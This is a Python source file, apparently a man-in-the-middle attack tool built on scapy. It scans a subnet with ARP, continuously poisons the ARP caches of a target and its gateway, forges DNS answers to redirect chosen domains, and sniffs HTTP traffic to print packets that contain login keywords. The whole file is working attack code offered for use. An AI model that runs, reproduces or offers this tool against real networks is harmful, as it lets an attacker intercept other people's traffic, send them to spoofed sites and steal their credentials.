import logging
import threading
import time
from scapy.all import ARP, DNS, DNSQR, DNSRR, Ether, IP, TCP, UDP, sendp, srp, sniff, Raw

class MITM:
    """
    A class to handle Man-in-the-Middle attacks using ARP poisoning and DNS spoofing.
    """
    def __init__(self):
        self.poisoning = False
        self.dns_spoofing = False
        self.spoof_rules = {}
        self.poison_thread = None
        self.sniffer_thread = None

    def arp_scan(self, subnet):
        """
        Performs a fast ARP scan to discover live hosts on the local network.
        """
        logging.info(f"Starting ARP scan on subnet: {subnet}")
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet), timeout=2, verbose=False)
        hosts = []
        for sent, received in ans:
            hosts.append({'ip': received.psrc, 'mac': received.hwsrc})
        logging.info(f"ARP scan complete. Found {len(hosts)} live hosts.")
        return hosts

    def start_arp_poisoning(self, target_ip, gateway_ip):
        """
        Starts the ARP poisoning attack.
        """
        self.poisoning = True
        self.poison_thread = threading.Thread(target=self._arp_poison, args=(target_ip, gateway_ip))
        self.poison_thread.start()
        logging.info(f"ARP poisoning started between {target_ip} and {gateway_ip}")

    def stop_arp_poisoning(self, target_ip, gateway_ip):
        """
        Stops the ARP poisoning attack and restores the network.
        """
        self.poisoning = False
        if self.poison_thread:
            self.poison_thread.join()

        self._restore_network(target_ip, gateway_ip)
        logging.info("ARP poisoning stopped and network restored.")

    def start_dns_spoof(self, rules):
        """
        Starts the DNS spoofing attack and the packet sniffer.
        """
        self.dns_spoofing = True
        self.spoof_rules = rules
        self.sniffer_thread = threading.Thread(target=self._packet_sniffer)
        self.sniffer_thread.start()
        logging.info(f"DNS spoofing started with the following rules: {rules}")

    def stop_dns_spoof(self):
        """
        Stops the DNS spoofing attack.
        """
        self.dns_spoofing = False
        if self.sniffer_thread:
            self.sniffer_thread.join()
        logging.info("DNS spoofing stopped.")

    def _arp_poison(self, target_ip, gateway_ip):
        """
        The main ARP poisoning loop.
        """
        target_mac = self._get_mac(target_ip)
        gateway_mac = self._get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            logging.error("Could not resolve MAC addresses. Aborting.")
            self.poisoning = False
            return

        while self.poisoning:
            sendp(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
            sendp(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=False)
            time.sleep(2)

    def _packet_sniffer(self):
        """
        Sniffs for packets and processes them to find credentials or spoof DNS.
        """
        logging.info("Packet sniffer started.")
        while self.poisoning or self.dns_spoofing:
            sniff(filter="udp port 53 or tcp port 80", prn=self._process_packet, store=0, timeout=1)
        logging.info("Packet sniffer stopped.")

    def _process_packet(self, packet):
        """
        Callback function for the packet sniffer.
        """
        if self.dns_spoofing and packet.haslayer(DNSQR):
            self._dns_spoof(packet)

        if packet.haslayer(IP) and packet.haslayer(Raw):
            self._credential_sniffer(packet)

    def _dns_spoof(self, packet):
        """
        Handles DNS spoofing.
        """
        qname = packet[DNSQR].qname.decode()
        if qname in self.spoof_rules:
            spoofed_ip = self.spoof_rules[qname]
            response = Ether(src=packet[Ether].dst, dst=packet[Ether].src) / \
                       IP(src=packet[IP].dst, dst=packet[IP].src) / \
                       UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                       DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, an=DNSRR(rrname=qname, ttl=10, rdata=spoofed_ip))
            sendp(response, verbose=False)
            logging.info(f"Spoofed DNS response for {qname} -> {spoofed_ip}")

    def _credential_sniffer(self, packet):
        """
        Processes packets to find credentials.
        """
        try:
            load = packet[Raw].load.decode('utf-8', errors='ignore').lower()
            keywords = ['username', 'password', 'user', 'pass', 'login', 'email']
            if any(keyword in load for keyword in keywords):
                logging.warning(f"Potential credentials found in packet from {packet[IP].src}:")
                print(f"\n--- Credentials Found ---\n{load}\n--- End Credentials ---\n")
        except Exception:
            pass # Ignore decoding errors

    def _restore_network(self, target_ip, gateway_ip):
        """
        Restores the ARP tables of the target and gateway.
        """
        target_mac = self._get_mac(target_ip)
        gateway_mac = self._get_mac(gateway_ip)

        if not target_mac or not gateway_mac:
            return

        sendp(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=False)
        sendp(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=5, verbose=False)

    def _get_mac(self, ip):
        """
        Resolves the MAC address of a given IP address.
        """
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=2, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None
